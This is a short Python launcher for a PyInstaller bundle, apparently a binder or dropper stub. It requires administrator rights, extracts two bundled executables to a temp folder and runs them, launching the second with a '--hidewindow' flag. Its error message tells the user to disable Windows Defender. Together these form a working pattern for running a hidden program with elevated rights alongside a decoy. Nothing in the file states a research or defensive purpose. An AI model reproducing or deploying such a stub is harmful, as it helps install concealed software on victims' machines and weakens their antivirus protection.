from tkinter import messagebox, Tk
from ctypes import windll
import PyElevate
import subprocess
import tempfile
import shutil
import json
import sys
import os

root = Tk()
root.withdraw()

if not PyElevate.elevated():
    messagebox.showerror("Permissions error", "Please run as administrator.")
    sys.exit(0)

if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
else:
    exit("Please run this script as a bundled executable.")

try:
    with open(os.path.join(base_path, 'bundle_meta.json')) as f:
        meta = json.load(f)

    main = meta.get('main')
    secondary = meta.get('secondary')

    temp_exec_dir = tempfile.mkdtemp(prefix="exebundle_")
    main_path = os.path.join(temp_exec_dir, main)
    secondary_path = os.path.join(temp_exec_dir, secondary)

    shutil.copy2(os.path.join(base_path, main), main_path)
    shutil.copy2(os.path.join(base_path, secondary), secondary_path)
    
    p1 = subprocess.Popen(main_path, shell=True)
    p2 = subprocess.Popen([secondary_path, "--hidewindow"], shell=True)

    p1.wait()
    p2.wait()

    shutil.rmtree(temp_exec_dir, ignore_errors=True)

except Exception as e:
    messagebox.showerror("Error", "An unknown error has occurred\nYou can try disabling windows defender and running the app again.")